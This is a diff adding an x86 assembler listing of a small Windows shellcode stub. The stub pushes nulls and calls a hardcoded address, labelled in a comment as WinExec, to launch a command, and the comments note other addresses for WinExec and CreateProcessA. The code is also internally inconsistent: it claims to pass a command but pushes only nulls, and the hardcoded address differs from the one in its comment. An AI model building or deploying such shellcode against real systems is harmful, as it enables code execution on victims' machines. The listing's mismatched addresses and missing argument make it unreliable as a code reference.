@@ -1,0 +1,13 @@
+     1                                  global _start
+     2                                  
+     3                                  _start:
+     4                                  
+     5 00000000 31C0                    	xor eax,eax          ;clear eax
+     6 00000002 50                      	push eax             ;push null onto stack
+     7 00000003 BB1EFD0577              	mov ebx,0x7705fd1e   ;place winExec address into ebx 0x775b3061
+     8 00000008 50                      	push eax
+     9 00000009 50                      	push eax
+    10 0000000A 50                      	push eax
+    11 0000000B 50                      	push eax
+    12 0000000C FFD3                    	call ebx             ;call WinExec({cmd},0)  #For createProcessA : 0x77531072
+    13                                  
